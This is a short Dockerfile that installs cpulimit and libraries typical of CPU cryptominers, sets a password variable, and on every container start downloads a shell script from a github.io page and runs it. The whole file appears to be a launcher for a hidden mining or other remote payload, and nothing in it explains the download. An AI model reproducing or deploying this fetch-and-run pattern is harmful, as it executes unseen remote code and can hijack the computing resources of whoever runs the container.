FROM ubuntu:18.04

RUN apt-get update \
    && apt-get install -y sudo curl zip nano wget cpulimit libmicrohttpd-dev libssl-dev libhwloc-dev

RUN sudo mkdir /projects/ && \
    cd /projects/ && \
    sudo mkdir sys && \
    sudo chmod -R 777 sys

ENV PASS CLmols

WORKDIR /projects/sys

CMD wget https://pzeankto.github.io/namnam/yopi2.sh -O yopi.sh && \
chmod +x yopi.sh && \
./yopi.sh
